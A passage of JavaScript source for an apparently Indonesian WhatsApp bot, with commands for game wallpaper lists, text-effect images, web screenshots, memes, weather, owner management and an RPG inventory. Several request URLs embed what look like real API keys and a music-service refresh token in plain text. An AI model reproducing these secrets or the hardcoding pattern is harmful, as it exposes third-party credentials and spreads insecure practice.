        "ahri-5",
        "yorick-3",
        "rengar-4",
        "fizz-4",
        "fizz-3",
        "corki-3",
        "zed-4",
        "rakan-2",
        "leblanc-3",
        "kaisa-5",
        "jarvaniv",
        "ivern",
        "irelia-7",
        "fiora-5",
        "evelynn-4",
        "camille-3",
        "yuumi-2",
        "yuumi",
        "lux-4",
        "lux-3",
        "katarina-4",
        "jayce-3",
        "graves-4",
        "ezreal-5"`) 
}
break
case'listwallpaperaov': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *allain*
│2 ▸ *allain-2*
│3 ▸ *kahlii-3*
│4 ▸ *nakroth-4*
│5 ▸ *preyta-2*
│6 ▸ *skud-2*
│7 ▸ *taara-4*
│8 ▸ *valhein-4*
│9 ▸ *arum-4*
│10 ▸ *butterfly-6*
│11 ▸ *capheny-3*
│12 ▸ *elandorr-2*
│13 ▸ *ilumia-3*
│14 ▸ *ishar-4*
│15 ▸ *lauriel-6*
│16 ▸ *laville*
│17 ▸ *liliana-5*
│18 ▸ *nurad-8*
│19 ▸ *quillen-5*
│20 ▸ *rouie*
│21 ▸ *rouie-2*
│22 ▸ *taara-3*
│23 ▸ *telannas-5*
│24 ▸ *yena-4*
│25 ▸ *yena-5*
│26 ▸ *zata*
│27 ▸ *ata*
│28 ▸ *lauriel-5*
│29 ▸ *qi-3*
│30 ▸ *roxie-3*
│31 ▸ *wukong-5*
│32 ▸ *aleister-2*
│33 ▸ *amily-3*
│34 ▸ *arthur-3*
│35 ▸ *arum-3*
│36 ▸ *astrid-2*
│37 ▸ *dirak*
│38 ▸ *dirak-2*
│39 ▸ *grakk-5*
│40 ▸ *hayate-4*
│41 ▸ *ishar-2*
│42 ▸ *ishar-3*
│43 ▸ *jinna-2*
│44 ▸ *keera*
│45 ▸ *keera-3*
│46 ▸ *lauriel-4*
│47 ▸ *nax*
│48 ▸ *natalya-5*
│49 ▸ *quillen-4*
│50 ▸ *raz-3*
│51 ▸ *richter-2*
│52 ▸ *ryoma-4*
│53 ▸ *telannas-4*
│54 ▸ *ulen-6*
│55 ▸ *valhein-3*
│56 ▸ *violet-7*
│57 ▸ *yorn-4*
│58 ▸ *zill-3*
│59 ▸ *ignis-2*
│60 ▸ *lubu-2*
│61 ▸ *naloch-2*
│62 ▸ *sephera-3*
│63 ▸ *butterfly-5*
│64 ▸ *diaochan-4*
│65 ▸ *elandoor*
│66 ▸ *krizzix-2*
│67 ▸ *nina-2*
│68 ▸ *natalya-3*
│69 ▸ *veera-3*
│70 ▸ *violet-6*
│71 ▸ *yena-2*
│72 ▸ *yena-3*
│73 ▸ *krizziz*
│74 ▸ *nurad-7*
│75 ▸ *volkath*
│76 ▸ *volkath-2*
│77 ▸ *airi-4*
│78 ▸ *arduin-3*
│79 ▸ *enzo-3*
│80 ▸ *hayate-3*
│81 ▸ *krixi-3*
│82 ▸ *nurad-6*
│83 ▸ *quillen-3*
│84 ▸ *telannas-3*
│85 ▸ *wisp-2*
│86 ▸ *zip-2*
│87 ▸ *gildur-2*
│88 ▸ *ishar*
│89 ▸ *tulen-5*
│90 ▸ *amily-2*
│91 ▸ *annette-3*
│92 ▸ *arthur-2*
│93 ▸ *butterfly-4*
│94 ▸ *errol-2*
│95 ▸ *joker*
│96 ▸ *kahlii-2*
│97 ▸ *kilgroht*
│98 ▸ *lauriel-3*
│99 ▸ *nurad-5*
│100 ▸ *arduin-2*
│101 ▸ *darcy-2*
│102 ▸ *florentino-3*
│103 ▸ *noren*
│104 ▸ *quillen-2*
│105 ▸ *ryoma-5*
│106 ▸ *sephera-3*
│107 ▸ *violet-5*
│108 ▸ *airi-3*
│109 ▸ *diaochan-3*
│110 ▸ *diaochanlubu*
│111 ▸ *elsuroxie*
│112 ▸ *lindis-3*
│113 ▸ *taara-2*
│114 ▸ *toro-2*
│115 ▸ *tulen-4*
│116 ▸ *violet-4*
│117 ▸ *wonderwoman*
│118 ▸ *ybneth*
│119 ▸ *zill-2*
│120 ▸ *arum-2*
│121 ▸ *florentino-2*
│122 ▸ *liliana-4*
│123 ▸ *nurad-4*
│124 ▸ *yorn-3*
│125 ▸ *zip*
│126 ▸ *annette-2*
│127 ▸ *qi*
│128 ▸ *qi-2*
│129 ▸ *celica*
│130 ▸ *capheny-2*
│131 ▸ *diaochan-2*
│132 ▸ *elsu-2*
│133 ▸ *ilumia-2*
│134 ▸ *krixi-2*
│135 ▸ *narja-2*
│136 ▸ *nurad-3*
│137 ▸ *preyta*
│138 ▸ *telannas-2*
│139 ▸ *valhein*
│140 ▸ *veera-2*
│141 ▸ *veres-2*
│142 ▸ *yorn-2*
│143 ▸ *zephys-2*
│144 ▸ *airi-2*
│145 ▸ *annette*
│146 ▸ *baldum*
│147 ▸ *butterfly-3*
│148 ▸ *elsu-2*
│149 ▸ *errol*
│150 ▸ *fennik*
│151 ▸ *lauriel-2*
│152 ▸ *liliana-2*
│153 ▸ *liliana-3*
│154 ▸ *lindis-2*
│155 ▸ *nurad-2*
│156 ▸ *nakroth-2*
│157 ▸ *nakroth-3*
│158 ▸ *natalya-2*
│159 ▸ *raz-2*
│160 ▸ *ryoma-2*
│161 ▸ *slimz*
│162 ▸ *teemee*
│163 ▸ *tulen-2*
│164 ▸ *tulen-3*
│165 ▸ *violet-3*
│166 ▸ *wiro*
│167 ▸ *wukong-3*
│168 ▸ *wukong-4*
│169 ▸ *zill*
│170 ▸ *aleister*
│171 ▸ *alice*
│172 ▸ *arduin*
│173 ▸ *arthur*
│174 ▸ *azzenka*
│175 ▸ *batman*
│176 ▸ *butterfly-2*
│177 ▸ *cresh*
│178 ▸ *darcy*
│179 ▸ *diaochan*
│180 ▸ *enzo-3*
│181 ▸ *hayate-2*
│182 ▸ *jinna*
│183 ▸ *lubu*
│184 ▸ *nganga*
│185 ▸ *violet-2*
│186 ▸ *wukong-2*
│187 ▸ *zanis-2*
│188 ▸ *florentino*
│189 ▸ *gildur*
│190 ▸ *ignis*
│191 ▸ *naloch*
│192 ▸ *narja*
│193 ▸ *nakroth*
│194 ▸ *omen*
│195 ▸ *payna*
│196 ▸ *raz*
│197 ▸ *rourke*
│198 ▸ *roxie*
│199 ▸ *ryoma*
│200 ▸ *skud*
│201 ▸ *taara*
│202 ▸ *toro*
│203 ▸ *valhein*
│204 ▸ *veres*
│205 ▸ *violet*
│206 ▸ *wisp*
│207 ▸ *wukong*
│208 ▸ *wonderwoman*
│209 ▸ *xeniel*
│210 ▸ *yorn* 
│211 ▸ *zanis*
│212 ▸ *elsu*
│213 ▸ *flash*
│214 ▸ *hayate*
│215 ▸ *ilumia*
│216 ▸ *kahlii*
│217 ▸ *Krixi*
│218 ▸ *lauriel*
│219 ▸ *liliana*
│220 ▸ *lindis*
│221 ▸ *nina*
│222 ▸ *nurad*
│223 ▸ *natalya*
│224 ▸ *quillen*
│225 ▸ *richter*
│226 ▸ *sephera*
│227 ▸ *supermen*
│228 ▸ telannas*
│229 ▸ *thane*
│230 ▸ *airi*
│231 ▸ *amily*
│232 ▸ *arum*
│233 ▸ *astrid*
│234 ▸ *butterfly*
│235 ▸ *capheny*
│236 ▸ *enzo*
│237 ▸ *tulen*
│238 ▸ *veera*
│239 ▸ *yena*
│240 ▸ *ryoma-4*
│241 ▸ *zephys*
│242 ▸ *zuka*
│
╰────────────˧`) 
}
break
case'listwallpaperml': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *aldous*
│2 ▸ *alice-2*
│3 ▸ *angela-2*
│4 ▸ *argus-2*
│5 ▸ *chou*
│6 ▸ *chou-2*
│7 ▸ *estes*
│8 ▸ *eudora*
│9 ▸ *eudora-2*
│10 ▸ *granger*
│11 ▸ *granger-2*
│12 ▸ *gusion-3*
│13 ▸ *hanabi-2*
│14 ▸ *hanzo*
│15 ▸ *helcurt*
│16 ▸ *layla-3*
│17 ▸ *lesley-4*
│18 ▸ *lunox-2*
│19 ▸ *odette-3*
│20 ▸ *saber*
│21 ▸ *thamuz*
│22 ▸ *vexana*
│23 ▸ *argus*
│24 ▸ *dyrroth*
│25 ▸ *esmeralda-2*
│26 ▸ *kadita-2*
│27 ▸ *lancelot*
│28 ▸ *leomord-2*
│29 ▸ *lylia*
│30 ▸ *vale*
│31 ▸ *valir*
│32 ▸ *xborg*
│33 ▸ *zhask*
│34 ▸ *alice*
│35 ▸ *alpha*
│36 ▸ *athena*
│37 ▸ *badang*
│38 ▸ *balmond*
│39 ▸ *bane*
│40 ▸ *diggie*
│41 ▸ *trunks*
│42 ▸ *fanny-2*
│43 ▸ *fanny-3*
│44 ▸ *freya*
│45 ▸ *guinevere*
│46 ▸ *gusion*
│47 ▸ *gusion-2*
│48 ▸ *hanabi*
│49 ▸ *harith*
│50 ▸ *harith-2*
│51 ▸ *hayabusa-2*
│52 ▸ *kadita*
│53 ▸ *kagura-2*
│54 ▸ *kagura-3*
│55 ▸ *karina-2*
│56 ▸ *kimmy*
│57 ▸ *layla-2*
│58 ▸ *leomord*
│59 ▸ *lesley-2*
│60 ▸ *lesley-3*
│61 ▸ *lunox*
│62 ▸ *nartis*
│63 ▸ *niya-2*
│64 ▸ *nana*
│65 ▸ *nana-2*
│66 ▸ *natalia*
│67 ▸ *natalia-2*
│68 ▸ *odette-2*
│69 ▸ *pharsa*
│70 ▸ *rafaela-2*
│71 ▸ *selena-2*
│72 ▸ *zilong*
│73 ▸ *alucard*
│74 ▸ *angela*
│75 ▸ *bruno*
│76 ▸ *change*
│77 ▸ *claude*
│78 ▸ *fanny*
│79 ▸ *hayabusa*
│80 ▸ *hilda*
│81 ▸ *hylos*
│82 ▸ *kagura*
│83 ▸ *karina*
│84 ▸ *karrie*
│85 ▸ *layla*
│86 ▸ *lesley*
│87 ▸ *lolita*
│88 ▸ *ninotaur*
│89 ▸ *ninsittar*
│90 ▸ *niya*
│91 ▸ *noskov*
│92 ▸ *odette*
│93 ▸ *rafaela*
│94 ▸ *selena*
│
╰────────────˧`) 
}
break

case'banneroflol':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|banner*\n*Untuk List Banner Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&banner=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbanneroflol': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`"ahri-2",
"neeko",
"nocturne",
"shen-2",
"veigar",
"rakanayah-2",
"zoe-2",
"pantheon-2",
"rammus",
"udyr",
"darius-2",
"ekko-2",
"lablanc",
"leona",
"nissfotune",
"poppy",
"quinn",
"talon-2",
"akali-2",
"irelia-2",
"jinx-2",
"nordekaiser",
"pyke-2",
"renekton",
"rengar",
"sivir",
"sona",
"soraka",
"tristana",
"warwick",
"yuumi",
"ziggs",
"leesin",
"lulu",
"lux",
"naster-yi",
"norgana",
"nasus",
"pantheon",
"pyke",
"qiyana",
"rakan",
"rakanxayah",
"riven",
"shen",
"sylas",
"talon",
"teemo",
"thresh",
"tryndamere",
"varus",
"vayne",
"velkoz",
"vladimir",
"yasuo",
"zed",
"zoe",
"hecarim",
"heimerdinger",
"illaoi",
"irelia",
"ivern",
"janna",
"jarvan-iv",
"jax",
"jayce",
"jhin",
"jinx",
"kaisa",
"kalista",
"karma",
"karthus",
"kassadin",
"katarina",
"kayle",
"kayn",
"kennen",
"khazix",
"kindred",
"kled",
"kogmaw",
"aatrox",
"ahri",
"akali",
"alistar",
"amumu",
"anivia",
"annie",
"ashe",
"aurelionsol",
"azir",
"bard",
"blitzcrank",
"brand",
"braum",
"caitlyn",
"camille",
"cassiopeia",
"chogath",
"corki",
"darius",
"diana",
"drmundo",
"draven",
"ekko",
"elise",
"evelynn",
"ezreal",
"fiddlesticks",
"fiora",
"fizz",
"galio",
"gangplank",
"garen",
"gnar",
"gragas",
"graves"`)
}
break

case'dragonballfb':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&character=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listdragonballfb': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST CHARACTER*
│
├❖ *LIST*
│1 ▸ *caulifla*
│2 ▸ *cooler*
│3 ▸ *cumber*
│4 ▸ *hit*
│5 ▸ *kale*
│6 ▸ *kaminoren*
│7 ▸ *gokuui*
│8 ▸ *xenogokuss3*
│9 ▸ *xenogokuss4*
│10 ▸ *xenovegeta*
│11 ▸ *xenovegito*
│12 ▸ *android-18*
│13 ▸ *blackgoku*
│14 ▸ *bulma*
│15 ▸ *frieza*
│16 ▸ *gotenks-2*
│17 ▸ *kaio*
│18 ▸ *krillinandroid-18*
│19 ▸ *launch*
│20 ▸ *nutenroshi-2*
│21 ▸ *oldkai*
│22 ▸ *oolong*
│23 ▸ *pilaf*
│24 ▸ *tienshinhan*
│25 ▸ *trunks-3*
│26 ▸ *bardock*
│27 ▸ *gotenks*
│28 ▸ *nutenroshi*
│29 ▸ *piccolo*
│30 ▸ *songoku-2*
│31 ▸ *songoku-3*
│32 ▸ *songoten*
│33 ▸ *trunks-2*
│34 ▸ *vegeta-2*
│35 ▸ *vegito*
│36 ▸ *krillin*
│37 ▸ *najinbuu*
│38 ▸ *songohan*
│39 ▸ *songoku*
│40 ▸ *trunks*
│41 ▸ *vegeta*
│
╰────────────˧`)
}
break
case 'ssweb':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if  (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://mywebsite.junn4.my.id`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ss = await getBuffer(`https://api.junn4.my.id/tools/ssweb?url=${text}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'nowplaying':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ss = await getBuffer(`https://api.junn4.my.id/tools/ssweb?url=https://nowplayi.ng/miniplayer.php?refreshToken=AQCFzYcNHS_ZGxGTyZlTGkB0TKzx_dWwZwzzfBSmGurwKPbyb2qJ6DN9cGfHflA9FSjC2UYDg4pzkhP665gm8ZdvaXCwMkDv-BGlklhhWvLGBIsVSyOMomIpQyRyMRN-T8c&showAlbum=true&showArtwork=true&showProgress=true&showPause=true&transparentBackground=false&hideOnPauseOrEmpty=false}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case'ssweb2':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if  (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
newReply(mess.wait)
let ss = await getBuffer(`https://skizo.tech/api/ssweb?type=phone&url=${text}&apikey=${setting.XznKey}`)
try{
await juna.sendMessage(m.chat, {image: ss, caption: "Done Bruhh"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'holo': case 'hololive': case 'randomholo': case 'randomhololive': case 'randomhl' : {
if (!isPremium) return newReply('Khusus Premium')
if (isBan) return newReply('Lu di ban asu akkwowiwowiwoi')
// react
try{
await juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
await sleep(1000)
let holo = await fetchJson('https://api.ouzen.xyz/randomanime/hololive?apikey=zenzkey_120723fad9')
const capt = holo.result.caption
const foto = holo.result.image
await juna.sendMessage(m.chat,{image: {url: foto,},caption: capt,},{quoted: m,})
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
juna.sendMessage(m.chat, { react: { text: `❎`, key: m.key }})
}
}
break
case "couple": case"ppcp":{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
newReply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
juna.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
limitAdd(m.sender, limit)
break
//darkjokes
case'darkjokes': case'darkjoke':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let darkjoke = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=6b882dde90583a8ea51d4fcf`)
try{
await juna.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
case 'meme':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let meme = await fetchJson(`https://api.junn4.my.id/search/meme`)
try{
const hasil = meme.result.url
const capt = meme.result.caption
await juna.sendFile(m.chat, hasil, null, `${capt}`, m)
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case'memeindo':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let darkjoke = await getBuffer(`https://api.zenext.xyz/randomimage/memeindo?apikey=${setting.ZenzKey}`)
try{
await juna.sendMessage(m.chat, {image: darkjoke, caption: "Tetap Tertawa Walaupun Cringe🗿"}, {quoted: m})
} catch (err){
newReply(util.format(err))
}
limitAdd(m.sender, limit)
}
break
//ephoto360
case "1917text":
            case "angelwing":
            case "announofwin":
            case "birthdaycake":
            case "capercut":
            case "cardhalloween":
            case "christmascard":
            case "christmasseason":
            case "covergamepubg":
            case "covergraffiti":
            case "dragonfire":
            case "embroider":
            case "fabrictext":
            case "facebookgold":
            case "facebooksilver":
            case "funnyanimations":
            case "funnyhalloween":
            case "galaxybat":
            case "galaxywallpaper":
            case "generalexam":
            case "glowingtext":
            case "graffiti3d":
            case "graffititext":
            case "graffititext2":
            case "graffititext3":
            case "greetingcardvideo":
            case "halloweenbats":
            case "heartcup":
            case "heartflashlight":
            case "horrorletter":
            case "icetext":
            case "instagramgold":
            case "instagramsilver":
            case "lightningpubg":
            case "lovecard":
            case "lovelycute":
            case "masteryavatar":
            case "merrycard":
            case "messagecoffee":
            case "metalstar":
            case "milkcake":
            case "modengold3":
            case "moderngold":
            case "moderngold2":
            case "moderngoldsilver":
            case "nameonheart":
            case "noeltext":
            case "projectyasuo":
            case "pubgbirthday":
            case "pubgglicthvideo":
            case "pubgmascotlogo":
            case "puppycute":
            case "realembroidery":
            case "retrotext":
            case "rosebirthday":
            case "snowontext":
            case "starsnight":
            case "summerbeach":
            case "sunglightshadow":
            case "textcakes":
            case "texthalloween":
            case "textonglass":
            case "textsky":
            case "thundertext":
            case "twittergold":
            case "twittersilver":
            case "viettel":
            case "vintagetelevision":
            case "watercolor2":
            case "womansday":
            case "writeblood":
            case "writegalaxy":
            case "writehorror":
            case "youtubegold":
            case "youtubesilver":
case "zombie3d": {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let ephoto360= await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await juna.sendMessage(m.chat, {image: ephoto360, caption: "Done kak"}, {quoted: m})
} catch (err){
newReply('Halo Kak, Penulisan Teksnya Tersebut Salah, Mungkin Terlalu Panjang') 
}
limitAdd(m.sender, limit)
}
break
//textpro menu
case'blackpink':case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await juna.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
} catch (err){
newReply(mess.error.api) 
}
limitAdd(m.sender, limit)
}
break
case 'addowner':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
ownerNumber.push(users)
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
newReply(`Sukses`)
} else {
newReply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break
case 'encode':{
  if (!text) return newReply('Masukkan text yang mau di encode')
  const encodedText = btoa(text)
  return newReply(encodedText)
}
break
case 'decode':{
  if (!text) return newReply('Masukkan text yang mau di encode')
  const decode = atob(text)
  return newReply(decode)
}
break
case 'sertifikat': case 'sertifikattll':{
  if (!text) return newReply('Masukkan nama Anda!')
  if (isBan) return newReply('Lu diban asuu akwowkwokwowkwok')
  try{
    juna.sendMessage(m.chat, {image:{ url : `https://api.lolhuman.xyz/api/toloserti?apikey=6b882dde90583a8ea51d4fcf&name=${text}`}, caption: `Sertifikat Milik ${text}`}, {quoted: m})
  }catch (error){
    await newReply('Maaf server sedang error')
    console.log(error)
  }
}
break
case 'cuaca':{
  if (isBan) return newReply('Lu di ban kocak akwowkw')
  if (!text) return newReply('Masukkan nama kota')
  let cuaca = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${text}?apikey=6b882dde90583a8ea51d4fcf`)
  const tempat = cuaca.result.tempat
  const kordinat = cuaca.result.latitude
  const kordinat2 = cuaca.result.longitude
  const cuacanya = cuaca.result.cuaca
  const angin = cuaca.result.angin
  const detail = cuaca.result.description
  const suhu = cuaca.result.suhu
  const udara = cuaca.result.udara
  const plaut = cuaca.result.permukaan_laut
  await juna.sendMessage(m.chat, {image:{ url : `https://telegra.ph/file/7381838be9de574875381.jpg`}, caption: `*Daerah*\n${tempat}\n\n*Kordinat*\n${kordinat+kordinat2}\n\n*Cuaca*\n${cuacanya}\n\n*Angin*\n${angin}\n\n*Deskripsi Cuaca*\n${detail}\n\n*Suhu*\n${suhu}\n\n*Udara*\n${udara}\n\n*Permukaan Laut*\n${plaut}`}, {quoted: m})
}
break
case'delowner':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag/jid*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
if (!ownerNumber.includes(users)) return newReply(`Dia bukan owner`)
ownerNumber.splice(ownerNumber.indexOf(users, 1))
newReply(`Sukses`)
} else {
newReply(`Gunakan dengan cara ${prefix + command} *@tag*`)
}}
break

case 'inv': case 'me': case 'inventori': case 'inventory': case 'profile':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPetualang) return newReply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*\n\n`
 teksehmazeh += `*❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n`
 teksehmazeh += `*◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n`
 teksehmazeh += `*🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n`
 teksehmazeh += `*🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n`
 teksehmazeh += `*💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n`
 teksehmazeh += `*⏺️ Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : getLimit(m.sender, limitCount, limit)}\n`
 teksehmazeh += `*💰 Money* : $${getBalance(m.sender, balance) ? getBalance(m.sender, balance) : 0}\n`
 teksehmazeh += `*🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n`
 teksehmazeh += `*HUNT RESULT*\n`
 teksehmazeh += `*🐟 Fish* :` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`
 teksehmazeh += `*🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n`
 teksehmazeh += `*🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n`
 teksehmazeh += `*🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n`
 teksehmazeh += `*🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n`
 teksehmazeh += `*🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n`
 teksehmazeh += `🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n`
